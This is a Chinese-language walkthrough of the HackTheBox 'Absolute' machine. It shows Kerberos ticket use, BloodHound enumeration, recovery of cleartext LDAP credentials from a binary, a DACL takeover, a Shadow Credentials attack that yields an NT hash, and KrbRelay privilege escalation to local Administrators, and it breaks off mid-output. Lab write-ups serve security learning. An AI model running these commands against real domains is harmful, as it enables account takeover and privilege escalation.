验证 d.klay 权限，发现三个服务全部返回 `STATUS_LOGON_FAILURE`，说明这个域的 NTLM 认证被禁用（该账号同时是 `Protected Users` 组成员），只能走 Kerberos。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ sudo nxc ldap 10.129.232.60 -u 'd.klay' -p 'Darkmoonsky248girl'
LDAP        10.129.232.60   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb) (signing:None) (channel binding:Never)
LDAP        10.129.232.60   389    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl:Darkmoonsky248girl
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ sudo nxc smb 10.129.232.60 -u 'd.klay' -p 'Darkmoonsky248girl'
SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.60   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl:Darkmoonsky248girl STATUS_LOGON_FAILURE
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ sudo nxc winrm 10.129.232.60 -u 'd.klay' -p 'Darkmoonsky248girl'
WINRM       10.129.232.60   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.232.60   5985   DC               [-] absolute.htb\d.klay:Darkmoonsky248girl:Darkmoonsky248girl
```

## Kerberos 认证

先同步时间。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ sudo ntpdate 10.129.232.60
2026-09-14 09:32:25.091926 (-0400) +25154.880876 +/- 0.200336 10.129.232.60 s1 no-leap
CLOCK: time stepped by 25154.880876
```

获取 d.klau 的票据并导入环境。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ sudo impacket-getTGT -dc-ip 10.129.232.60 'absolute.htb/d.klay:Darkmoonsky248girl'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in d.klay.ccache
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ export KRB5CCNAME=$(pwd)/d.klay.ccache
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ klist
Ticket cache: FILE:/home/kali/Work/Kali/Absolute/Users/d.klay.ccache
Default principal: d.klay@ABSOLUTE.HTB

Valid starting       Expires              Service principal
09/14/2026 10:02:46  09/14/2026 14:02:46  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
	renew until 09/14/2026 14:02:46
```

用票据访问 SMB，可以看到 `Shared` 目录可读。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ nxc smb dc.absolute.htb -u d.klay -d absolute.htb -k --use-kcache
SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\d.klay from ccache
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/Users]
└─$ nxc smb dc.absolute.htb -u d.klay -d absolute.htb -k --use-kcache --shares
SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\d.klay from ccache 
SMB         dc.absolute.htb 445    DC               [*] Enumerated shares
SMB         dc.absolute.htb 445    DC               Share           Permissions     Remark
SMB         dc.absolute.htb 445    DC               -----           -----------     ------
SMB         dc.absolute.htb 445    DC               ADMIN$                          Remote Admin
SMB         dc.absolute.htb 445    DC               C$                              Default share
SMB         dc.absolute.htb 445    DC               IPC$            READ            Remote IPC
SMB         dc.absolute.htb 445    DC               NETLOGON        READ            Logon server share 
SMB         dc.absolute.htb 445    DC               Shared                          
SMB         dc.absolute.htb 445    DC               SYSVOL          READ            Logon server share 
```

## BloodHound 采集

bloodhound-python 需要解析域内名称，先启动一个假 DNS，并再次同步时间。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ sudo ntpdate 10.129.232.60

[sudo] password for kali:
2026-09-15 05:49:10.471471 (-0400) +25151.112363 +/- 0.039705 10.129.232.60 s1 no-leap
CLOCK: time stepped by 25151.112363
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ nohup python3 -u fakedns.py > /tmp/fakedns.log 2>&1 &
[1] 3665
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ dig @127.0.0.1 dc.absolute.htb A +short
10.129.232.60
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ dig @127.0.0.1 dc.absolute.htb AAAA +short
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ bloodhound-python -u d.klay -p 'Darkmoonsky248girl' -d absolute.htb \
  -dc dc.absolute.htb -ns 127.0.0.1 --disable-autogc -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: absolute.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done in 00M 24S
INFO: Compressing output into 20260915054954_bloodhound.zip
```

将数据导入 BloodHound 分析。

从 d.klay 出发没有可利用的路径。

![](Pasted%20image%2020260915113718.png)

## LDAP 查询

使用 `d.klay` 的票据查询 LDAP。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ ldapsearch -H ldap://dc.absolute.htb -b "dc=absolute,dc=htb"
...... 
......
```

在 `svc_smb` 的 `description` 字段中发现了一个密码。

![](Pasted%20image%2020260916145741.png)

将凭据记录到本地文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ cat Users/svc_smb
svc_smb:AbsoluteSMBService123!
```

## 再探 SMB

使用该凭据登录 SMB。

返回 `STATUS_ACCOUNT_RESTRICTION`。这个状态码表示密码验证是通过的，只是被策略禁止了 NTLM 登录（该账号也是 `Protected Users` 组成员），所以仍然改走 Kerberos。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ nxc smb dc.absolute.htb -u svc_smb -p 'AbsoluteSMBService123!'

SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.60   445    DC               [-] absolute.htb\svc_smb:AbsoluteSMBService123! STATUS_ACCOUNT_RESTRICTION
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ getTGT.py absolute.htb/svc_smb:'AbsoluteSMBService123!' -dc-ip 10.129.232.60
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_smb.ccache
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ export KRB5CCNAME=$PWD/svc_smb.ccache
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ klist
Ticket cache: FILE:/home/kali/Work/Kali/Absolute/svc_smb.ccache
Default principal: svc_smb@ABSOLUTE.HTB

Valid starting       Expires              Service principal
09/16/2026 10:24:01  09/16/2026 14:24:01  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
	renew until 09/16/2026 14:24:01
```

`Shared` 目录可读。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ nxc smb dc.absolute.htb --use-kcache
SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.absolute.htb 445    DC               [+] ABSOLUTE.HTB\svc_smb from ccache
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ nxc smb dc.absolute.htb --use-kcache --shares
SMB         dc.absolute.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc.absolute.htb 445    DC               [+] ABSOLUTE.HTB\svc_smb from ccache
SMB         dc.absolute.htb 445    DC               [*] Enumerated shares
SMB         dc.absolute.htb 445    DC               Share           Permissions     Remark
SMB         dc.absolute.htb 445    DC               -----           -----------     ------
SMB         dc.absolute.htb 445    DC               ADMIN$                          Remote Admin
SMB         dc.absolute.htb 445    DC               C$                              Default share
SMB         dc.absolute.htb 445    DC               IPC$            READ            Remote IPC
SMB         dc.absolute.htb 445    DC               NETLOGON        READ            Logon server share
SMB         dc.absolute.htb 445    DC               Shared          READ
SMB         dc.absolute.htb 445    DC               SYSVOL          READ            Logon server share
```

尝试登陆 winrm 失败了。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ nxc winrm dc.absolute.htb --use-kcache
WINRM       dc.absolute.htb 5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:absolute.htb)
```

使用 smbclient 连接 `Shared` 目录，下载全部文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/smb]
└─$ smbclient.py absolute.htb/svc_smb:'AbsoluteSMBService123!'@dc.absolute.htb -k -dc-ip 10.129.232.60
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use Shared
# ls
drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 .
drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 ..
-rw-rw-rw-         72  Thu Sep  1 13:02:23 2022 compiler.sh
-rw-rw-rw-      67584  Thu Sep  1 13:02:23 2022 test.exe
# get compiler.sh
# get test.exe
# exit
┌──(kali㉿kali)-[~/Work/Kali/Absolute/smb]
└─$ ls -liah
total 80K
4456459 drwxrwxr-x 2 kali kali 4.0K Sep 16 10:53 .
4456469 drwxrwxr-x 7 kali kali 4.0K Sep 16 10:52 ..
4456460 -rw-rw-r-- 1 kali kali   72 Sep 16 10:53 compiler.sh
4456463 -rw-rw-r-- 1 kali kali  66K Sep 16 10:53 test.exe
```

目录里有一个编译脚本和一个 Windows 程序。

从 `compiler.sh` 可以看出 `test.exe` 是一个用 Nim 编写的程序。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute/smb]
└─$ cat compiler.sh
#!/bin/bash

nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1
┌──(kali㉿kali)-[~/Work/Kali/Absolute/smb]
└─$ file test.exe
test.exe: PE32+ executable for MS Windows 5.02 (GUI), x86-64 (stripped to external PDB), 11 sections
```

将文件复制到 windows 上。

![](Pasted%20image%2020260916160644.png)

使用 tshark 抓包。这台机器有多张网卡，需要确认流量实际走的是哪一张，否则抓不到数据。

在 Wireshark 中跟踪 TCP 流，可以看到 `test.exe` 先查询 `_ldap._tcp.dc.absolute.htb` 与 `dc.absolute.htb`，然后使用 LDAP 的 `simple` 认证向域控发起绑定，用户名与密码都是明文的。

```bash
PS C:\Users\Chenling > & "C:\Program Files\Wireshark\tshark.exe" -D
1. \Device\NPF_{4CF1D984-EFE4-4366-97FC-9DBB161F791D} (OpenVPN TAP-Windows6)
2. \Device\NPF_{DFA3E3F5-92C1-4AF7-BA54-A21CA9266EDC} (Ethernet0)
3. \Device\NPF_Loopback (Adapter for loopback traffic capture)
4. \Device\NPF_{360B58C7-348D-4B25-9C1D-A8B160EC8A7C} (OpenVPN Data Channel Offload)
5. \Device\NPF_{EAB5E4CC-0D92-4D5D-B242-322BC08D5CED} (OpenVPN Wintun)
6. etwdump (Event Tracing for Windows (ETW) reader)
Commando VM 09/17/2026 14:28:06
PS C:\Users\Chenling > cd C:\Users\Chenling\Desktop\Work
Commando VM 09/17/2026 14:29:09
PS C:\Users\Chenling\Desktop\Work > Remove-Item run3.pcapng -ErrorAction SilentlyContinue
>>
Commando VM 09/17/2026 14:29:16
PS C:\Users\Chenling\Desktop\Work > & "C:\Program Files\Wireshark\tshark.exe" -i 1 -i 2 -i 3 -w run3.pcapng -a duration:25 -q
Capturing on 3 interfaces
1 packet dropped from Ethernet0
1 packet dropped from \Device\NPF_Loopback
1057 packets captured
Commando VM 09/17/2026 14:29:33
PS C:\Users\Chenling\Desktop\Work > & "C:\Program Files\Wireshark\tshark.exe" -i 1 -i 2 -i 3 -w run3.pcapng -a duration:25 -q
Capturing on 3 interfaces
1 packet dropped from Ethernet0
1849 packets captured
Commando VM 09/17/2026 14:30:26
PS C:\Users\Chenling\Desktop\Work > & "C:\Program Files\Wireshark\tshark.exe" -r run3.pcapng 2>$null | Measure-Object -Line

Lines Words Characters Property
----- ----- ---------- --------
 1849


Commando VM 09/17/2026 14:31:28
PS C:\Users\Chenling\Desktop\Work > & "C:\Program Files\Wireshark\tshark.exe" -r run3.pcapng -Y "dns" 2>$null
>>
   77 1.001182100   10.10.10.3 → 10.10.10.2   DNS 76 Standard query 0xe0dc A api.deepseek.com
   78 1.001217700   10.10.10.3 → 10.10.10.2   DNS 76 Standard query 0x2c06 AAAA api.deepseek.com
   79 1.001761600   10.10.10.2 → 10.10.10.3   DNS 92 Standard query response 0xe0dc A api.deepseek.com A 198.18.0.16
   80 1.001848400   10.10.10.2 → 10.10.10.3   DNS 76 Standard query response 0x2c06 AAAA api.deepseek.com
  171 1.990220300   10.10.10.3 → 10.10.10.2   DNS 76 Standard query 0x97fc AAAA api.deepseek.com
  172 1.991445700   10.10.10.2 → 10.10.10.3   DNS 76 Standard query response 0x97fc AAAA api.deepseek.com
  213 2.342028200  10.10.10.71 → 10.10.10.2   DNS 86 Standard query 0x9eae SRV _ldap._tcp.dc.absolute.htb
  215 2.343495500   10.10.10.2 → 10.10.10.71  DNS 161 Standard query response 0x9eae No such name SRV _ldap._tcp.dc.absolute.htb SOA a.root-servers.net
  216 2.346637100  10.10.10.71 → 10.10.10.2   DNS 86 Standard query 0x26cb SRV _ldap._tcp.dc.absolute.htb
  218 2.347704500   10.10.10.2 → 10.10.10.71  DNS 161 Standard query response 0x26cb No such name SRV _ldap._tcp.dc.absolute.htb SOA a.root-servers.net
  219 2.349185900  10.10.10.71 → 10.10.10.2   DNS 75 Standard query 0x45d6 A dc.absolute.htb
  220 2.349988700   10.10.10.2 → 10.10.10.71  DNS 91 Standard query response 0x45d6 A dc.absolute.htb A 198.18.0.86
  775 10.555296600  10.10.10.71 → 10.10.10.2   DNS 86 Standard query 0x2fc3 SRV _ldap._tcp.dc.absolute.htb
  776 10.556429200   10.10.10.2 → 10.10.10.71  DNS 161 Standard query response 0x2fc3 No such name SRV _ldap._tcp.dc.absolute.htb SOA a.root-servers.net
  777 10.557351700  10.10.10.71 → 10.10.10.2   DNS 86 Standard query 0x1d15 SRV _ldap._tcp.dc.absolute.htb
  778 10.558240300   10.10.10.2 → 10.10.10.71  DNS 161 Standard query response 0x1d15 No such name SRV _ldap._tcp.dc.absolute.htb SOA a.root-servers.net
  779 10.559441100  10.10.10.71 → 10.10.10.2   DNS 75 Standard query 0x2972 A dc.absolute.htb
  780 10.560245800   10.10.10.2 → 10.10.10.71  DNS 91 Standard query response 0x2972 A dc.absolute.htb A 198.18.0.86
 1173 15.515745900  10.10.10.71 → 10.10.10.2   DNS 86 Standard query 0xe965 SRV _ldap._tcp.dc.absolute.htb
 1174 15.516850700   10.10.10.2 → 10.10.10.71  DNS 161 Standard query response 0xe965 No such name SRV _ldap._tcp.dc.absolute.htb SOA a.root-servers.net
 1175 15.517631800  10.10.10.71 → 10.10.10.2   DNS 86 Standard query 0x4a4a SRV _ldap._tcp.dc.absolute.htb
 1176 15.518540800   10.10.10.2 → 10.10.10.71  DNS 161 Standard query response 0x4a4a No such name SRV _ldap._tcp.dc.absolute.htb SOA a.root-servers.net
 1177 15.519601500  10.10.10.71 → 10.10.10.2   DNS 75 Standard query 0x19e5 A dc.absolute.htb
 1178 15.520491600   10.10.10.2 → 10.10.10.71  DNS 91 Standard query response 0x19e5 A dc.absolute.htb A 198.18.0.86
 1289 17.068470200  10.10.10.71 → 10.10.10.2   DNS 86 Standard query 0x90aa SRV _ldap._tcp.dc.absolute.htb
 1290 17.069701800   10.10.10.2 → 10.10.10.71  DNS 161 Standard query response 0x90aa No such name SRV _ldap._tcp.dc.absolute.htb SOA a.root-servers.net
 1291 17.070584200  10.10.10.71 → 10.10.10.2   DNS 86 Standard query 0x3c52 SRV _ldap._tcp.dc.absolute.htb
 1292 17.071498800   10.10.10.2 → 10.10.10.71  DNS 161 Standard query response 0x3c52 No such name SRV _ldap._tcp.dc.absolute.htb SOA a.root-servers.net
 1293 17.072668100  10.10.10.71 → 10.10.10.2   DNS 75 Standard query 0x2e6c A dc.absolute.htb
 1294 17.073748000   10.10.10.2 → 10.10.10.71  DNS 91 Standard query response 0x2e6c A dc.absolute.htb A 198.18.0.86
Commando VM 09/17/2026 14:31:35
PS C:\Users\Chenling\Desktop\Work > & "C:\Program Files\Wireshark\tshark.exe" -r run3.pcapng -Y "ldap" -V 2>$null | Select-String -Pattern "bindRequest|userDN|authentication|simple" -Context 0,3

>     LDAPMessage bindRequest(1) "absolute.htb\mlovegod" simple
          messageID: 1
>         protocolOp: bindRequest (0)
>             bindRequest
                  version: 3
                  name: absolute.htb\mlovegod
>                 authentication: simple (0)
>                     simple: AbsoluteLDAP2022!

  Frame 784: Packet, 114 bytes on wire (912 bits), 114 bytes captured (912 bits) on interface \Device\NPF_{DFA3E3F5-92C
1-4AF7-BA54-A21CA9266EDC}, id 1
      Section number: 1
>     LDAPMessage bindRequest(1) "absolute.htb\mlovegod" simple
          messageID: 1
>         protocolOp: bindRequest (0)
>             bindRequest
                  version: 3
                  name: absolute.htb\mlovegod
>                 authentication: simple (0)
>                     simple: AbsoluteLDAP2022!

  Frame 1182: Packet, 114 bytes on wire (912 bits), 114 bytes captured (912 bits) on interface \Device\NPF_{DFA3E3F5-92
C1-4AF7-BA54-A21CA9266EDC}, id 1
      Section number: 1
>     LDAPMessage bindRequest(1) "absolute.htb\mlovegod" simple
          messageID: 1
>         protocolOp: bindRequest (0)
>             bindRequest
                  version: 3
                  name: absolute.htb\mlovegod
>                 authentication: simple (0)
>                     simple: AbsoluteLDAP2022!

  Frame 1298: Packet, 114 bytes on wire (912 bits), 114 bytes captured (912 bits) on interface \Device\NPF_{DFA3E3F5-92
C1-4AF7-BA54-A21CA9266EDC}, id 1
      Section number: 1
>     LDAPMessage bindRequest(1) "absolute.htb\mlovegod" simple
          messageID: 1
>         protocolOp: bindRequest (0)
>             bindRequest
                  version: 3
                  name: absolute.htb\mlovegod
>                 authentication: simple (0)
>                     simple: AbsoluteLDAP2022!



```

## m.lovegod

使用 m.lovegod 凭据获取票据。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022! -dc-ip 10.129.232.60
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in m.lovegod.ccache
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ export KRB5CCNAME=$PWD/m.lovegod.ccache
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ klist
Ticket cache: FILE:/home/kali/Work/Kali/Absolute/m.lovegod.ccache
Default principal: m.lovegod@ABSOLUTE.HTB

Valid starting       Expires              Service principal
09/17/2026 09:32:47  09/17/2026 13:32:47  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
	renew until 09/17/2026 13:32:47
```

在 BloodHound 中查看 `m.lovegod` 的权限关系。

`m.lovegod` 是 `Network Audit` 组的 owner，而 `Network Audit` 组对 `winrm_user` 有 `GenericWrite` 权限。

![](Pasted%20image%2020260917144651.png)

提权路径如下。

```
M.LOVEGOD ──Owns──> NETWORK AUDIT@ABSOLUTE.HTB ──GenericWrite──> WINRM_USER ──MemberOf──> REMOTE MANAGEMENT USERS
```

## Shadow Credentials

先查看 `Network Audit` 组的 ACL 与成员。

`m.lovegod` 读不到该组的 `nTSecurityDescriptor`，说明它目前并不是这个组的 owner，需要先接管组。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b 'DC=absolute,DC=htb' -LLL \
  '(cn=Network Audit)' nTSecurityDescriptor member
SASL/GSSAPI authentication started
SASL username: m.lovegod@ABSOLUTE.HTB
SASL SSF: 256
SASL data security layer installed.
dn: CN=Network Audit,CN=Users,DC=absolute,DC=htb
member: CN=svc_audit,CN=Users,DC=absolute,DC=htb

# refldap://ForestDnsZones.absolute.htb/DC=ForestDnsZones,DC=absolute,DC=htb

# refldap://DomainDnsZones.absolute.htb/DC=DomainDnsZones,DC=absolute,DC=htb

# refldap://absolute.htb/CN=Configuration,DC=absolute,DC=htb
```

将 `m.lovegod` 设为 `Network Audit` 组的 owner，并给自己写入 `FullControl`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ impacket-dacledit -k -no-pass 'absolute.htb/m.lovegod' -dc-ip dc.absolute.htb \
  -principal m.lovegod -target 'Network Audit' -action write -rights FullControl
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20260917-104636.bak
[*] DACL modified successfully!
```

将 `m.lovegod` 加入 `Network Audit` 组，并重新获取票据。

对 `winrm_user` 进行 Shadow Credentials 攻击，为其写入 `msDS-KeyCredentialLink`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ certipy-ad shadow auto -k -no-pass -u 'absolute.htb/m.lovegod@dc.absolute.htb' \
  -dc-ip 10.129.232.60 -target dc.absolute.htb -account winrm_user
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'fb9508eafb774e64950e1b6c53d17592'
[*] Adding Key Credential with device ID 'fb9508eafb774e64950e1b6c53d17592' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID 'fb9508eafb774e64950e1b6c53d17592' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_user@absolute.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_user.ccache'
File 'winrm_user.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename):
[*] Wrote credential cache to 'winrm_user_3d0a4a18-8f76-45b0-94c3-27f405c0e7fa.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
```

写入成功，拿到了 `winrm_user` 的 NT hash 与票据。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ export KRB5CCNAME=$PWD/winrm_user_3d0a4a18-8f76-45b0-94c3-27f405c0e7fa.ccache
                                                                                                                                                    
┌──(kali㉿kali)-[~/Work/Kali/Absolute]
└─$ evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB

                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> whoami
absolute\winrm_user

```

使用票据登录 WinRM。

```bash
*Evil-WinRM* PS C:\programdata\Apps> dir


    Directory: C:\programdata\Apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/17/2026  12:20 PM        2609152 BouncyCastle.Crypto.dll
-a----        9/17/2026  12:28 PM           6656 CheckPort.exe
-a----        9/17/2026  12:20 PM          22016 Interop.NetFwTypeLib.dll
-a----        9/17/2026  12:28 PM         662016 KrbRelay.exe
-a----        9/17/2026  12:20 PM         775680 MimeKitLite.dll
-a----        9/17/2026  12:26 PM          51712 RunasCs.exe
-a----        9/17/2026  12:20 PM          20856 System.Buffers.dll

```

## 提权

`winrm_user` 只是 `Remote Management Users` 组的成员，并不是管理员，需要提权。

将 KrbRelay、CheckPort、RunasCs 以及 KrbRelay 依赖的 DLL 上传到目标机，注意 DLL 必须与 KrbRelay 放在同一目录。

使用 CheckPort 查找一个防火墙允许 `SYSTEM` 使用的端口。

```bash
*Evil-WinRM* PS C:\programdata\Apps> .\CheckPort.exe
[*] Looking for available ports..
[*] SYSTEM Is allowed through port 10

```

使用 RunasCs 以 logon type 9 启动 KrbRelay，中继域控机器账户的 Kerberos 认证到 LDAP，把 `winrm_user` 加入 `Administrators` 组。

```bash
*Evil-WinRM* PS C:\programdata\Apps> .\RunasCs.exe winrm_user -d absolute.htb TotallyNotACorrectPassword -l 9 "C:\programdata\Apps\KrbRelay.exe -spn ldap/dc.absolute.htb -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -port 10 -add-groupmember Administrators winrm_user"

[*] Relaying context: absolute.htb\DC$
[*] Rewriting function table
[*] Rewriting PEB
[*] GetModuleFileName: System
[*] Init com server
[*] GetModuleFileName: C:\programdata\Apps\KrbRelay.exe
[*] Register com server
objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAAA2yJsZpYymfUzq1bO6hu0SAlQAAPwU///CVvhlp7nCsyIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:

[*] Forcing SYSTEM authentication
[*] Using CLSID: 8f5df053-3013-4dd8-b5f4-88214e81c0cf
[*] apReq: 608206b406092a864886f71201020201006e8206a33082069fa003020105a10302010ea20703050020000000a38204e1618204dd308204d9a003020105a10e1b0c4142534f4c5554452e485442a2223020a003020102a11930171b046c6461701b0f64632e6162736f6c7574652e687462a382049c30820498a003020112a103020104a282048a04820486f31a5a273e47e08a89f12c759e99010726fd49ec1612b7596054268f45af7c6a9d5b57c90a8ca401e73e3d2eb155e70acaf5d11815f69d1775a608812aca97270a629af7700a1000d596e8497025c5cde73bc0924711d5b0ef1a8f476c778ab9732300f1943a8834f9f0729ff0d9e6351c143697c31972e3a2ec7de930761a05c221943eb4fa68fbb9ea1c06e78e2808e4a139a05e6744b316f3059ec9dbf176df4bcaa988e4717c38e5a71a49b8d679b0671bcd416804b231689edfaeb63392bd747949488eea88dfd6427519bebebc3d50950f5f59fbc0995d59f12b0cd6797a378b7ba9080ac91d4a7f07bf5ddc3e1944ced65f86cb981e6cba8d8ab583b454ffdbda68c58622cb33432cf1ba5058063c90ca044c1c41d6ed29e8b2b7f509dcfabf55ab427a9eb31a1316932319b2bbb241ad9148005ca54fb8b4e679714d66e7d15099ecd09550a61b89692876d01981325177fd3a9f5aa72d31f4d576a59731d36d609d3d991585e63e9c0082059f95864bc787959d66241ed0db9a4d6deec620cb9326e3daca1a36ab0fc0ae528e8def7ed61be76895c412fdcfcfba1893322bdd935414c1193278d3ea7249141203f5d17ce3557c7610c8f1ceead173d207c25e2e05c8a8c2243ea4c8dec6190bde718c562726fd0b6d9323f0148f494bffd726b642c7d19ddf2660c6e4f8491a41458802fe39679331c293172b8b97b4c254a51a0c3ec57f875f0757134d6b3851ff4d6e6ca02750325b56d971644a0d3a571be61b5e4746d51df9f9df27d8995ec91c4fcbe3884b08c9ab014cd37c26b34d8379844f886962b480cc2353de0404620f6ceca2b6b1b8a3d7d5d3ea0eb2ba392b6fea755bff23bf2850aedb47cb095634f75d85f0ada4fc7f60150a84323a0e118850e8dca7c7fa089ed45a9f9fe79672d378d99105aa18663b1b2269f89a3484cd143c76b6392fbfe339b54bb71aee5e07315014a31bb61b3b3501b766b71fd9a15902ff8a0c9242f10614044d7b6d8d6f7d72da09f75969dd4db8dad2b6236087dc26dadfc704c8add15ae87b90682cf80123ab9f8c813c978c9c0dca3303533e45ed4688f01fd6ae883e5765b864e2c07e39ac3840afa9733312a67a5d828b3b8446df979c91d5be32ebab2e98916b6a892fa21371166118a94d7f6041653c8116c8b58e46ce45f69e1c44c433584dcd098fdf3317702bf8deebdbf74b5a4c447f8ceb656310cc20610b93456e527e670fe0d518bb586aadbbf6e48794c86349cfb52fa68f7cbcd047e8c44a9b7c04c9684b4bffefcd9a57ee1b4b26ad05557a024488759725af0edf2030a7ccd388ff32d56f3ca863f5ba7ce176e561f2d5b99f16b627da33e93406bf9e3c608b9d4024bc7db55e8126c02c2eb77cd0b2c0774f4cacf9a7ba092f5a42107e90a1c5b3d9463b0b5d856782bb48e23a2bb5df40a7892ef9f2472ff3471ddcbbb7925ea070977116409337bc3a02bdb3d8f659c3e3d36bbe8a832e6845f711423ea339bab99c2628544a17258ce7834b0d689f06d9b055e29314e68bd95d29fbd45d9c015850ae84d50a6436028605082c0fbe153d6320f1b01ec9e96ccf917b338807484b7a8a05ba3be2470d31d2e900e5315557a48201a33082019fa003020112a2820196048201921147d62691a9e199d70a4cc3f81ad2a60f53a072528662a980fe84006b713bca7d36cfb88d3d